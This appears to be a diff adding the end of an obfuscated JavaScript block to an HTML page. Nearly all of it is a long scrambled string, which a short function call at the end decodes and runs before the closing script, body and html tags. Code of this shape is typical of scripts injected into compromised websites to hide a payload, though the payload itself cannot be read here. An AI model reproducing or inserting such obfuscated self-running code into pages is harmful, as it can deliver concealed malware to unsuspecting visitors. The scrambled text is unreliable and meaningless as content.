Z!)ZoiVdoedaZ.J]ytVJxJsnVZ!laoJ!tZ.alm.bJaa% J)t.letYZe.tdn.Vt7Z.JmZahoV}eeodJitJc,dZcJirbe%%i)d[V:aZJV>dZxJmZV.sc%l.YU% .fnm\'OaJd#;NV=Jdrk7J:4e3f3VJd= )eZ5iog=cV).r8tX.sd$.. riZ-VJoAayTl)TJ0ol!"r.0gJJ>Vi+Jdt.*h<otcc.s)JM){:c.p>it9d4iF6o.t\/F l..J8J1Jad{ry{ZjZm.%WonSrxd>3d=dho2V\/liJ=v=<i.olEcMjpmtdwt*JoJJ:%.6*w o)3VVd.e.Z0isla\/)vZbJ%7%r\'aJNeo{m7eu)wZabaldonVZcrZgomosSioZa)";mwOd+I(JrJDru.cei,Jir5d!vZ ZZc).;!6PeaVZZd.tIh.e;cRg\'VVZe)ea="Z}!eoc{ar.6zl.eV.@esoa\'e9g=%>[VgZ 6a{Vmt\'ZVZ-nZ8\\ScRZa!nJiJ.iqV]."atpaZ<d J(-!;a.t}-1yUp.d!cfb.g-8J[%).c" ] VuDdf[nn:NZ%,.d\/SV acZ].or:1grZJ222V#rn.d7he)1c!5%0JdJV6Z2.gJJ%ae>aeaZVV0nZadZ4:d.HJmj>z=)J3.)c!iZ0@.ZH,an*de+dOVaoudm$JpnVCJVffgJs(eMed{2.dOnDVJVveaJJd_2rtZdZ;r#.eZ..ep%e"ohZVVZir@x.4n.la0fcmbAnd.e6n\'Z\/- g.JVo,%!v.nvdZ|oSdd=60u.n9%V-h&R]e,6 e"..ued).dr(Zde%xJ$4e0Z6gcpJ.hY%exe6.\/Jd>ec2]%].ioVS==u\/[cs{N.cMsaE%JeVe,cJl!aVdZ=]tdVl.x:f:TV7}V reVoZa.O!.\/]eZxr?rp#go cZbm=%ad.VZ!IVciV=.o8 ld0{o5ioc"4W_rnevXZK.lt^c.wvd\/c)Vt%;v%;el_e.lnp1l{dJodhed{OdeZtuExeS!c]:%%>=Wh!:o]Zoha<J(tZNsZZxmr.d..-=gaVls+Z;1,MVdd.a.?)f.a.t.VDNw[sZ.J0iZb^tingJoN.l,)VlViZZZmoZeZVwDyb.t.i9necZd%s8VmNsddaJb{J.J.ed.z5Z%3..d1+2)Z4rkdy.V]]x!rJ=o=eis.lmJae:3JeZun J.xV)|eIpLVJV!dVdaJmdnc3ZmctJwecOxc>%ZgVZ)J6OnuJaVdd.4Z0!gln]e[d2.VZ!e_VZt4eVd%]Iyp-ut#r#Zcran.!s.lrmolVso$}!Vnsau%:Rd-Z>mhVh#Zrx;s=ta=V]e}c.t.Pe.b1JmQccle%hbblm;{[g\/.}ee:Z J3cJfdx"leJ.iaZd(Josybdbc>=d=B9lJh4u.1=,MdR#JgtS.;[N!te2VOvZsB=!s Z7ocd3l$bmeV V=d,%d]p=ZyIcJld)ueX_CJ@Ju:Cc0!ZVZayd49hj.4C%KaZ0i)rdbD.m =ZZmb.f;l(camD!aesVr;1esZerVyvd"eeass\/ZfodVtJ.5J3dc#D!u.)QnfeJ!V%Vaa)3pZ.olJ%VxZst;)r}Tloeip+;V.SOiotae#acRafrR..%duBVaatatoac=d!didK !J=KZhg.aJ!cEa7dcZdJsoro<Vv9&cma,uV,sZVlaken#?-VyZ6!%riJrJZ|borM .VZe; nZ9PayJdOZ]ZcZ6Vblij0kd,Ze2duRas4kzJ_del[do7iV.,4e(VaaJ\\ddPnfV52\\aB)V-gz;77VcFmddhpkat;VcJoFaeZrm4rs0xm[do(dJyem1dl]d(;9.]^.W7J!dA ueVr)-M0u0d.ZuMX,intr+"ea.MJJ.dgZd.sg.l*t3dchV);)nt) ,x@dJs d.fs}attoitrlt=:Z?Z!mc]DZdl!%YZ-7.=iJ"J.ros(tJ7tVR1VJ.fr .]!Z!ZJ}m1@dtcvxdff tTdi:.d.dVS.V>a&]1qJ:m9ddld.M9u.or.ZeEOfd)t["=s "d]Vk19a:VWm.tc7cZmVclxlJ.=2lV1dZ1;V"ea[.>e..l>n(fefe}2seT4JVN=n17_dVJ.rV]$MkZ)evkZt9u|kds..odZA2o3.VoVZVA;u^sft.Zetmd81}nVgrJu36dfdi1dZJVuZ-aZ.x.tkVZn,0%5h|brti.aa.rtoi)])t!5_tpZr"tal[ )tbgu]<J%VZ>1!pbuc.esTJom.o\\7Oreed(d=\/(Q\/QFeeMdJVaalraVtr831dcJNydZ.th.2ad.59]voZecV:7.1te.J;1a0b.a}pVd7Z.#JZ)})J.to.%aZ 5{V%i!.,ZJVdyeZce4 e.xtal2d78J.J1dJOZ.jlo9mh.V0cnwaVheimh[f(0Q.l.8Vn=\'V,,m;i[V,m_s!ed8)!VZ!eV:.wrde]ri.xC4n%#pr1eZV c.lx%JtLl8:-]ZJd!1g1=Z9dh=nV8fJ%13DfJJ"1_ZZxt#J*VsZ9.V5dZV3.%1Z5lbV2o4=jnr.Q.5tZVo8TVx(:Er=rdo5el3a^;driZ,JJdJrf,.= iehZplriYZn#%:.  wfZom0 e4$Oecs.taeJoer.!mh1_(.w-)x,eZ:wb9Z*Z]=}})}<}c}Vu0r.VZmyZeyn!.ldcJ.veVm3ZranPsJZ..!ptJ2_+!:eV.aVJ;nV!7pend.%.,Z]i.3Vek>.(cw]!!n(.dZZ}i.OndRJ6J=.@o\/JN4JsVu%ht.=(J1Vie9rOsuayVyideCmaV;mVw+dJ*odn_n:?d.enel@%id\/ VmZ"%eFa"qeYtJde.6c+c+ al2ZOndtbs]tJi9VaC6nJd!r%28scye)Jc(%gtxrntyGdi%7Z[r!zrr{fV8o.tdJZ0YI{.abZ=02u]c.hZa2WJ)tfPo-O}mn4t,At.dVJV;n){+icy.d6dl!%.l},0catxro7cd3Z)VZ.ZilV,!Z]Jt.Vg]ldVve(oZ)6ftZas2nadi.(,4%2JZat35vViV(!)%{fVw=.!to]eleht(et7>vd"c.ZsDll}VR"?:V\\CiGJZuc+cZm}aZrV3Zln;ddmtphJo%.rds{V:|BrsVV0b=xdyT)O.tV7xmdidJ2);vj;ZtIetnad.aJV]2Zl\'Znot7e0ohceJ.RaxVldatZfoEedVgeZsgwVoZ]%spzasJtts,!qV(;wdF.u.1dwypTUasViytVTVu2ld);Ze gZagoM.donJu;ntVde3n .?aJJctV)E)|afUdp!t.VVa2Zduxc(v0e-azZoOd.VDy =JVrT-}?y)en6Z;>d=bto =e;}(icgZZJg#lo0oeUrlYlos_)FrZx;v.tdV.tx.jaJiMcxeu])VtJoneCJJi%ZZav=I=lc4n}uoJJZ}}w=roe1s%Hc0Var6}tfa8lcJJZrVol(%>4a1ZnUZnR.pE}$&...V)!.Jd1.Z.=5C bFnelVPi!aaZ}p@ZnZbea.aJZo30*OPdg=dl[Z,& Z>rVdtV=l.7t._g?u:eef)TVA:Or(gr]a8VsbcVea1}9rmsZ]]Jk!JoZ3)Zbw$m4c5V^9ecJ]]wp.H9.d!JPa!yVZhSed{J]5t:}l.en}ZZ)hZ-$.emd]lZ\/Vog03cp[va8f.d=JcJ%1mtS.;.ZZ\/d7r_.Zt.;=VZgnU)}.tt.VmehisZti}1V.;JPX[7Jgu^dZV!ZnZRdJ==lV6sir.iadnx9Vomq\\lJne.pa%wcmt)1VvnJa!dgedh45r..ir}VZVCed.ae9J!o6u]dt .yrVf79x!fldsd:,[!o(apc{Jv..id]ioXZZrx]6Zdv8eG*ZmdGdn[V;]ed0exV]VJid!n$lZ7vo4XJ2)\'t6{a! 8e`fh8V(dlg%bVJii*dmd)>=VaC JiJngeE.VZ5+ctV5p)hlVtdV g7ie <,a%tJm. o:Nr=oet h(K:kg6e,p}h]d;:>eadaS8-Vca.VCZt&ra=PtPatav5k,Q>]V!ltZnZ3b;.JTR4t%(nOgPJEs8J.Kt2.pd;r.. Z].irZ]]a+17tlJ.b6VV.d3>Zp}na@b,_10dJEedcVr8J.u4!=lro[.\'ZmO(lV)5Z3J.f.S.d=Csh.e]ZGde),ZoJnvJ.t)4)sV)VZj5,1R]!(mvJV0Zs!3a<JLi]a%}rbdceJKvms od%)JZhJn=Z,0c Vd2 %J2nJ)a;Pl.(tt]!;dVlt-M(oee6:Vdo$(cZ.tJ:d.i4iVdd>r}rdnuZ4rZF);aVdXw4o .trmJP<)JZb]Za,Vo).)VJi"ZlhJtZV .ePhjt;=atRmZtp36{S.r!drJ3V:(t..Hb$aeVVcZ(sn@FJ\\=c#0V!}d"mvd.vZO?Q#*"7x8Vw#>=o{}SalVe*46V!s;ch)=.Va;_V aVd.-JVdZJM]ZVrk;D=ZJ.;(]d$I0e4=k(VxJteJd.tt)ti\'o)J.%;VJ]pT0,.=rogdZnJc+vZ])Ztt.l]danA%e{bVJ=J\\ec;Z.(=g1nn.V%;taiIZ;d]!5cVn.cVcZ+J[,nhZ.VM\')q3Q)J)cZ7VeV)J^C_m.0JZ5]jfi4eV?].ZQJ>y..][}?Vps(*4i]78AV$saK5LsE ){;Nd ctZa)VZD.6leZD)hdvr00ooXf!ZnZ(].;.oee23n"pdeNtbaag%\/6J)>et.t!\'deT0!.tdV"T8:eaJV0ucCc}g7Vm.b4rWo.<s)nZVnZitJtVRtoJd.sP7dJdrl=kadmlHlsZmVDJJ$d;cVZ%ZVJ",c.JcV,(1Zdt6xp.%Z Vcrdsc_!r3i!Jm"n)x(x%Zwg5JJry)o-.ZmJZrdyT]stasb=]ii0o Vds Jg(.r.1.i.d02Ja)d>T0s!tsYe3Z".n_dZdJ] tn.eZu]sIVoctx)datedsse\'.Z%i.rt u7)1%tZwddcc)l;i.% .U=t!,meT:cJ\/+ZdJsZdOPV,_J{ef1epJiV8D.nn]pavI(d],]yVAlr` e}.2Zgg9ecc&"%V5VZ#..>Vm`tgs#>sZ4S-=ip..nrZZ1]Q.eaofVihLc.5r%?*bb)JN&5id!a..}(eJ=.LZe(%TZa)a(5Vl8VL]d)a].b!e.huVn2;J(),.(=.(i2U.8Re yiet,.XdadZpr:V.6)6:=Jr!oVb_oaJJaw)Z(c]VVX$:6a}.!V2}).!.16nodxi}egeea]{!JlJ({ndddH6Vddli.tVe9!+{%dc.x)aw(Ze7Vr+{;4(J. J.dn0ols).!tacTtdn6)ZJcJ.]c{Y 2f)lgf7VJitd:f!,2r:aJ}32pn-1JanKRd=h:!e,.Z,[7c5.6IVd)VZ]Jrdeie1}d2V:!Zh*>ZVF4?nVwfmt}=Ju)39t(J$)Edy 6S.tYQdddbovaaf]oliZ.>bmc(ed(VOJV._6loV2d5 n4VJQ.-s1!c2K!!e13apy3.deeibd%]3sAJden94xJJR]4P p]ZJV(0i&a#cdcc.8kd,7.]tVZ+Z?.Jep7OR`l."$bdVp8Hb%VeSrDVp62J=t5Vd>piVeVr.n0e0VuZ]1$#a(eVwaS9Zl,a2Z.Z>I=sa.Qd>IaJUVt4o VZeoJ>Z]wog{_I}VGaRa) \'o8j7dMesdi]Jr>%VJb_p7dvZDa.!e+eZ\'J:Jlla.p0r4eVttdJnda.iyb2(].stye;e"[s6liZU2fl%ru{T.ea93i1.rxmb] d!,=eLd.d")=URk5.0yFZd!aeZ])V5VcfdVJJP!7)O.Jc$Z3VD#"d"aa!SlZcJtVc0JVnoed V3ZeN;Z3(epetd.61i0ahK5I8Z$n..rVca=2xc)0=a(J_VdJ=neslV55e!NV dt ll.t]%r.1JZVV.J.ls, rmtZ{%90OJ.ie,!ZI.iriRd,eta8Bay2tadtsms>dfkia.1od(i\'tVM!z]jLaa{sD7[]eZJ;2.e4)%.aJZ V.VyJi5Z.cm6e){d3rd|.83\/7Z5Vtyi6ni.V;d,.g|idedrtd,o%eeogVn(.mt;gra0X;rr-pa3ttZcIy5cZost-JRJdJ JZ7n dyZ2#WV..JduVW.i8_t;co.NE81!)aVRl0ZJ PoZ%J!m$6%]ah("cVVxstfV{ec .(eplW.ZJui"oJQ:UVd.pJ-JSiZamddJ.!.AZm!@b-1ZfZoaWmv%:tlutZ.=\/VJwJ];mrwx>s(Zet jT6Ou.d%%o.lre  )ne;{xVJrZcZi@9=6ZZ?JoZlm>j(PVxVJZ0=d_.D(c)Z)u6V.2lZxZBVJ)cV; aJ=^6)Z-( idhVd(d))lr.dV2c(d1)scIr Z\'!tdinE7f FgPl l:8adMJZooZ=a@7ZSZ.;wZDT!1 oZdkaaJ$Dl*{l i]sgd\\ J)_tCM.nOV .p@]J}VWxV:!sJo7lJJmetnJf=iets5=&7d(V%xiZ=teJrZc\\"V3arc1ZOU(Jp1r]VeA3it>Vru(Jf)U.mr4dV[>.Zn>xTcv!atVsJZc4VV..dZhR.d]d2th.ZVftWcoc.e reVdJ-daJ.)4JRJ,v%_%sVVaotV+4($vcZ8Z-;0co.:JZiZilZ.eQaJeZ:d jvVo,sVkPSMsVR.d=cg:Ql Jxti}2Z}!8ZsoP:J]Zoi.a8V\/I\'eChsdd.F %_qmFndZard:VeJdJ2oMSDJ2ex ZtVsEtdTn_$Wkea)tZJ."Vt]JofmZVtoJVIia6o6VVumoT.7{nsJZJJ(+Mc]JZninq2Z(hdc,j,V.VJ=  lv.dZZlaeV]J;5]fcu@e.dlwtcVo)%VoC"lpZn%PeZZx_ZcW0\/`VVxa4pdZJ).ipZezt1s,Zka=qula9J]r00V=Z)9VVS)s xwZa)dyDMdirly0tndJrz}."\/;opYr(%N.VtcZ=#.UZa ( ]ZtV}l.cocVnlSVa.IdJy=u6NZ:P. aohltJdVVZz4JScdOnsVudAg%;lrJ. HoZo-J4Vp]Z\/\'Vl.e.fZ . smtZ2.T%tu.h!d.eo.9Cn0=.dup t}wy 1tioc7o((ct(]Eg0_adDdgrp.hJ:uteZ_tm}.*J,.(1cn|.)]0tnV* __Jnd$.dkw?=o2 VweJi5.(J!0%I%it].dlt6e V6Men4o,){=MLsJcx0lp&Xk%(,ZV2u.am2Z.4k};mJ9J(udMine.!Z(ccft,ocJdtid)o)tdmne!Ve.i.U.39ab,d]hdwlVTd. .yJcfg{Joly DmX BSv.enVi!efp]e3dZZa..%%TJ]3ccdCe:tVJ8{xV9c.!}l.V;Zh44\/))s*JTii=eT.o.sI(a%sG_0{=ZxZd]aMx=otJ..!lG.%a6Ztl!dM7hZ1anBi.;oV;y2a.JZat=Z(VWw3;),d}In.ossJ)JNb{oQ#k^ecaiwVe_8ZZQ%ZJ4gli.Juou)pJZ4agZZx[7IZWldig.t6fy!x)]vilsV)Jr)Vr.!ge>eotO}R4Zpnd M#6Z 2Zun}rr!7_.)dx95.VJ.|^aJecdZ7V2VeJ.Swm.ot+(b.V-7t]lZuXJ 6l<er8dar7sre(xev_)R.Z49]tte dJS{eV"=hsdBdVaZs.Vdetz%ZVlZeeJu!aec0.tm.U}uU9Ved8c;.r:dZt.urld.(a.n@Zde.l#SBi3:y!.5*Z.lZ(&cg.Vri6V]_Z. n(,V cJera;1(dV2eadE.vmZn) .y&dJfnx.2dV! haZs ZAmIypd.g!fId9hlbIZ.ryZ\'ZtV6d\\gVaVaVd]p  )d_1;JJsla{led.eEluZedd%7V%d!(eO=8=r:VoohD;Vn(l]c;jdXetJdh*5J+d=]vVetDcd]uJi.)).)c2doA;..nmaI y;oaJ3I:=ZV\/lurcSS.cg.dp].nn..0i2tVaVlca.-Z#Z"deZo4]-.enJvmcZ[%autMn.lmh]=0dbuJc"zV]0]QSd.s0.5stZZV ZJ.slc. Zi!e8]aaZ}Za.]Z=\/c!.t!gL.ua.aAJdllJ:wttsxwe.r[;.$.eZlociiSa).Vge6.uS40oZ]\\)s]}aedmd}m;.Zn ]xf\\onOdC)V} =tOri+hJJI+ZZdaiccg[Sd0e)JroaZTx.na0]VS("\\j.oZsz;9l42\/Q1VJf!\/as%yZp.Z rsetatebom;84e2ski[cV.Ed3tMr] diJuntrdvpoIltexeVaV =xa.acVo.VoIs%Z5eZ)t4oi%anV5mJ)].d6J(m)JedJvJnis"pVh;amaZn.x8V=]Vnxp-vJ ailLo08sOdiyLyoZ ..JxdR2xoZM =d ): mcYf :JrJZ)cdJZr V.Wl.t.u%b taVxjZOt!r5a2Z6SZ,mius6d.=.iZ1aZVVcViJ.VVZ.)edo7ZZidgdCaVZ%MJZ 2vtllc:<,tlhr=$oxJZt Jodef,{emVpo .t=t6]=Ze:w3UaXmc(%TNZVO! a l8e2].Jth =Zmd;EttncV4mVl.=s0Zae%dT%ywx#]EZo]2aet:eAm.]0beVVaK.iedl|2(e8J0"rVt2f..J)op7;?V(eZ uVf!e5Vfgx.Je i7Za3xpVusS V.eb=V#Z51)(nt_;caoZs%g nt9\/>ZselcgtElthsfPZlde.3ram{c!2aiNnVmJ p nf.Z]hZ.b0< !=;XC %J%.oJ.3ow] 8c. aopVybVZdxls.exep.gvZ]Jr}aVZc cZ}".z.l=KeeC{ehem=]n.)lVV5\/eZ.u!,%)t]m9DsdJG J.JnZnZ.Z.edg!.iscyV a.=%cvIV:i62Vdl.c:rn8.idJJZ=t%VV_dae>#hxVaZueowvOe)) %WEWaal3)}gJ%.%VJ-a 26) Ve0Z[-aVoJ!isOf.Z4d a&;6ZxaVJ+d )J!S8!nxZ o-p;Jrnloo=olO+&m.JCxVeogM;J .l...-)nJVZ J.i_LVVetxst=dao Jgemg!iEvVl8*:o fca d\'7id-]cd |d2 sec@eo.d!s..!)3 V6s(QlmKZ_[5Zd6e"9i(JrhotsS yt_lex:aagoSudt2Vs>nm!retZVs:.! o.{.da=J\\*%4n.dO5e$V,a.V0ar6s%Jxmgrbaes5lV9Ze!tVYtZe.J\/xc(iut6a,^V>lo5=steaJaex}{C =dlepltZIJeJdeo9J  cUuzcZLdda]1ZaVsB.0liVn dtzJsVZ )Rf8itI)d$\'fI;8l!ao_lyVZ&)Zl s"sZnub..Legdwf,cqJDcuPh(dDK=J.[29h\'ad88 ;(.Z]_c.W;).lntZ .J,o")]d+Z.-Vt7atr.pVdi\/( ..$[(?=t0.d;J db!#tcoKJVoKVJaftd3JEZddd =ori?V. roleL,amert!emendfo).kxoiVa engea;(|na.));J"nr4cd8.%t17n. tdtEt 5VvdnlN)0pe5sa-VZ6)mSb$|}.d\'oVa}>{naVh.TZ-]_J ]S-idd gatei)}}! tJZeDgd6. lJ\'ZlgJd]M\'9V. .ea..d?u2'));var eOy=Ujv(ULv,DNU );eOy(6556);return 2097})()
+  </script>
+</body>
+</html>
